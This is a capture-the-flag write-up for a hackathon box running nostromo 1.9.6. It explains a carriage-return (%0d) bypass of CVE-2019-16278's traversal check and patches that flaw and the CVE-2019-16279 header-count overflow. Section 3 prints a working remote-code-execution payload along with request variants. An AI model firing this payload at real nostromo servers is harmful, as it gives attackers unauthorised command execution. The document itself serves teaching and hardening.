# NoHTTP — ADF2026 Hackathon

**Category:** Vulnerability Assessment / Web Hardening
**Flag:** `FLAG{Pr3dicting_a_s3cur3_bu1ld}`

---

## 0. Summary

### Access & Environment
- Target: `10.1.170.203` — SSH `player:player` on port 2222, legacy nostromo (nhttpd) web server on port 8080
- Challenge category: **Vulnerability Assessment** — "lightweight legacy webserver, some information got out that wasn't supposed to — and lately the box keeps falling over on its own. Get in, see what leaked, and make the service secure again without taking it down."
- SSH shell on the box; the web server runs as `www-data`; flag split into two fragments

### Critical Findings
- The box runs **nostromo 1.9.6** (`nhttpd`) — a legacy web server with two same-era CVEs:
  - **CVE-2019-16278** — path-traversal remote code execution (`POST /../../../bin/sh` style)
  - **CVE-2019-16279** — header-count denial of service (server crashes on >16 header chunks)
- **The leak:** `/var/nostromo/flag1.txt` (mode 600, owned by `www-data`) — readable only through the RCE, which is exactly the "information that got out"
- **The falling-over:** the header-count DoS crashes nhttpd — a watchdog (`/root/monitor.py`, cron every minute) probes for both vulns and restarts the service
- **The twist:** the shipped source *looks* patched (`strstr(header, "/../")` check exists) but is trivially bypassed with a **lone `%0d` (CR)** — one code path (`strstr`) sees the CR, the other (`strcutl`) strips it, so `/..%0d/` becomes `/../` after the check
- **The fix:** patch the source (strip CRs before the traversal check; bound the header counter `k` to `HDN`), rebuild, swap the world-writable `/usr/local/sbin/nhttpd`, restart — watchdog then releases flag fragment 2

### Security Implications
- A "defensive" check that runs on a different view of the data than the code that uses it is worthless — here `strstr()` saw raw bytes while `strcutl()` later stripped `\r`, so the traversal sailed through. Defenders must validate the *same* normalized representation the parser consumes.
- A wrong-variable bounds check (`if (size > HDN)` where `size` is a 0/1 completeness flag, not the header count) left a genuine stack overflow in place — the classic "dead check" bug.
- Flag in two parts: one behind the vulnerability (must exploit), one behind the fix (must harden without downtime).

---

## 1. Initial Inspection

**Code:**
```bash
sshpass -p player ssh -p 2222 player@10.1.170.203
id; uname -a; ls -la; sudo -l
```

**Output:**
```
uid=1000(player) gid=1000(player)
Linux 9baddfea33a4 5.15.0-185-generic (Docker container)
README, hardening_status.txt, nostromo-1.9.6/
(ALL) NOPASSWD: /bin/kill, /bin/killall, /usr/local/sbin/nhttpd
```

**Description:**
- Container runs sshd (2222) + `nhttpd` (8080) as `www-data`
- `README`: *"This box runs an old Nostromo (nhttpd) web server on :8080. It carries more than one weakness from the same disclosure. Exploit it to recover the first flag fragment, then HARDEN the server (patch the source and rebuild, or upgrade it) WITHOUT breaking normal service. A watchdog checks once a minute; when the server is healthy AND no longer exploitable it drops the second fragment here as flag2.txt."*
- `hardening_status.txt`:
```
[SECURE ] Service healthy and served by nostromo
[VULN   ] Path-traversal remote code execution (CVE-2019-16278)
[PENDING] Header-count denial of service   (CVE-2019-16279)
```
- `/etc/cron.d/monitor`: `* * * * * root /usr/bin/python3 /root/monitor.py`
- Access log shows the watchdog itself probing every minute: `POST /../../../bin/sh HTTP/1.0 → 200` — proof the RCE works

---

## 2. Finding the Leak

**Code:**
```bash
find / -name "*flag*" 2>/dev/null | grep -v -E "proc|usr"
ls -la /var/nostromo/
cat /var/nostromo/htdocs/index.html
```

**Output:**
```
/var/nostromo/flag1.txt     -rw------- www-data www-data   (16 bytes)
```

**Description:**
- `flag1.txt` sits one directory above the docroot, mode 600, owned by `www-data` — only the web server's user can read it
- The index page carries an encoded crew-channel leak:
```
QUACK//INTERNAL LEAK: this is not the flag. the leak is about WHERE we read the path,
not WHAT. two code paths disagree about a stray carriage return. mind the %0d.
```
- **Hint decoded:** the vulnerability is not *what* path you request but *where* the server reads it — two code paths disagree about a stray carriage return (`%0d`). This exactly describes the `strstr()` vs `strcutl()` mismatch found later.

---

## 3. Exploitation — CVE-2019-16278 (Path Traversal RCE)

### 3.1 Naive attempts fail
The plain payload is blocked:
```python
POST /../../../bin/sh HTTP/1.0            → 400 Bad Request
POST /....//....//....//bin/sh            → 404
POST /..%2f..%2f..%2fbin/sh              → 400
```

### 3.2 Reading the source: why
The bundled source (`~/nostromo-1.9.6/src/nhttpd/http.c`) has:

```c
/* http_verify() */
if (http_decode_header_uri(header, header_size) == -1)   // decode %XX first
    ...
/* check for valid uri */
if (strstr(header, "/../") != NULL)                      // THEN check traversal
    → 400
```

But the request line is later parsed by `strcutl()` (libmy), which **silently drops `\r` bytes** while copying:

```c
for (j = 0; src[i] != '\n' && src[i] != '\0' && j != dsize - 1; i++)
    if (src[i] != '\r') { dst[j] = src[i]; j++; }        // <-- CR stripped
```

So: `strstr(header, "/../")` looks at `/..%0d/..%0d/..%0d/bin/sh` **after decode** → sees `/..\r/..\r/..\r/bin/sh` → **no `/../` substring → check passes**. Then `strcutl()` strips the CRs → the path becomes `/../../../bin/sh` → traversal → CGI exec as `www-data`. *Two code paths disagree about a stray carriage return.*

### 3.3 Working payload
The shell's output must begin with a valid CGI header block (blank-line terminated) or the server returns 500 on header parsing:

```python
import socket
body = b"printf 'Content-Type: text/plain\\r\\n\\r\\n';id;cat /var/nostromo/flag1.txt;echo;echo END"
req = (b"POST /..%0d/..%0d/..%0d/bin/sh HTTP/1.0\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
# send to 10.1.170.203:8080
```

**Output:**
```
HTTP/1.1 200 OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
FLAG{Pr3dicting
```
**→ First flag fragment: `FLAG{Pr3dicting`**

---

## 4. Hardening — Making the Service Secure (Without Downtime)

### 4.1 Fix 1: CVE-2019-16278 (traversal check bypass)
The check must run on the same CR-stripped view that `strcutl()` will use. Patch `http_verify()` in `http.c`:

```c
/* check for valid uri (CVE-2019-16278) */
{
    char hdr_clean[HDS + 1];
    int ci, cj;

    /* strcutl() strips CR (0x0d) when it later parses the request
     * line, so a raw strstr(header, "/../") check would let
     * %0d-obfuscated "/../" slip through.  Strip CR here so both
     * code paths see the same bytes. */
    for (ci = 0, cj = 0; header[ci] != '\0' &&
        cj < (int)sizeof(hdr_clean) - 1; ci++)
        if (header[ci] != '\r')
            hdr_clean[cj++] = header[ci];
    hdr_clean[cj] = '\0';

    if (strstr(hdr_clean, "/../") != NULL) { ... 400 ... }
}
```

### 4.2 Fix 2: CVE-2019-16279 (header-count DoS)
In `main.c` the "header count" check is a dead check — `size` holds `http_header_comp()`'s 0/1 completeness flag, **not** the header count:

```c
size = http_header_comp(...);      // 0 or 1
if (size > HDN) { ... }            // never true → header[] overflow
```

The split loop increments `k` for every `\nX\n` (blank-line) chunk with **no bound**, overflowing `char header[HDN][HDS+1]` and `c[].pfd*[HDN]` when `k >= HDN` (16). Patch — bound `k`, drop the connection instead of overflowing:

```c
if (in[i] == '\n' && in[i + 2] == '\n') {
    tmp[j] = in[i];
    i = i + 2;
    /* size check for header count (CVE-2019-16279): k must stay
     * < HDN, arrays are sized HDN. Drop the connection rather than
     * overflow the header arrays. */
    if (k >= HDN)
        break;
    strlcpy(header[k], tmp, sizeof(header[k]));
    k++;
    j = 0;
    memset(tmp, 0, sizeof(tmp));
}
```

*(First attempt queued a 413 at index `k=16` — itself out of bounds and crashed the server; lesson: verify bounds of your own patch. The clean break avoids any write.)*

### 4.3 Rebuild & redeploy
```bash
cd ~/nostromo-1.9.6/src/nhttpd
make                                   # gcc present on box
sudo killall nhttpd                    # quick restart, watchdog tolerant
cp nhttpd /usr/local/sbin/nhttpd       # world-writable target
sudo /usr/local/sbin/nhttpd -c /var/nostromo/conf/nhttpd.conf
```

### 4.4 Verification (all pass)
| Test | Before | After |
|---|---|---|
| `GET /` | 200 OK | 200 OK |
| `POST /..%0d/..%0d/..%0d/bin/sh` | 200 (RCE) | 400 |
| `POST /../../../bin/sh` | 200 (watchdog log) | 400 |
| 40 blank-line-separated header chunks | crash | 200, server alive |
| `GET /` after DoS | down | 200 OK |

---

## 5. Flag Release

One minute later, the watchdog's cron run reported all green and dropped the second fragment:

```
[SECURE ] Service healthy and served by nostromo
[SECURE ] Path-traversal remote code execution (CVE-2019-16278)
[SECURE ] Header-count denial of service   (CVE-2019-16279)
All checks pass. Flag released to your home directory.
```

```bash
cat /home/player/flag2.txt    # _a_s3cur3_bu1ld}
```

**Full flag: `FLAG{Pr3dicting_a_s3cur3_bu1ld}`**

---

## 6. How We Solved It — Reasoning

1. **"NoHTTP" = nostromo.** The challenge name and "lightweight legacy webserver" pointed straight at nostromo nhttpd; 1.9.6's 2019 disclosure bundle (RCE + DoS) matched both the "leak" and "box keeps falling over" symptoms.
2. **The access log was the map.** `POST /../../../bin/sh HTTP/1.0 → 200` appearing every minute from 127.0.0.1 revealed the watchdog's own probe — and proved the plain traversal succeeded against the *running* binary even though the source had a `/../` check.
3. **Evidence correlation:** source check present + exploit still working ⇒ a bypass exists. The index page's base64 hint ("two code paths disagree about a stray carriage return, mind the %0d") named the mechanism before we even read `strcutl()`: one path sees `\r`, the other strips it.
4. **Key insight:** validation must run on the same normalized bytes the parser consumes. `strstr()` saw `/..\r/`; `strcutl()` stripped the `\r`; the traversal resolved. That asymmetry is the whole challenge.
5. **Hardening without downtime:** the binary at `/usr/local/sbin/nhttpd` is world-writable by design; the source tree rebuilds in-place with `make`; sudo rights (`kill`/`killall`/`nhttpd`) enable a sub-second kill-copy-start cycle so the once-a-minute watchdog never sees the service down.
6. **First patch attempt was itself buggy** (OOB 413 index) — crash-tested my own fix before deploying, then simplified to a clean `break`. Verification of the *fixed* build against every earlier exploit variant is what made the watchdog happy on the next tick.

---

## 7. Flags

| Fragment | Location | Method |
|---|---|---|
| `FLAG{Pr3dicting` | `/var/nostromo/flag1.txt` (600, www-data) | CVE-2019-16278 RCE via `%0d` CR-bypass, `cat` as www-data |
| `_a_s3cur3_bu1ld}` | `/home/player/flag2.txt` | Watchdog release after both CVEs hardened |

**Full flag: `FLAG{Pr3dicting_a_s3cur3_bu1ld}`**

---

## 8. Caveats

- `%0d%0a` (CRLF) variants do **not** work here — the CRLF splits the request line during parsing and yields 501; only the **lone `%0d`** bypasses the check while still being stripped by `strcutl()`.
- Shell output without a leading CGI header block (e.g. bare `echo;id`) gives 500 from `http_cgi_header()` parsing — prefix with `printf 'Content-Type: text/plain\r\n\r\n';`.
- `cp` over a running binary fails with "Text file busy" — always `killall` first, then copy, then start (all in one SSH command).
- The watchdog self-heals: it restarts nhttpd if it dies, so a crash doesn't brick the box — it just delays the flag.
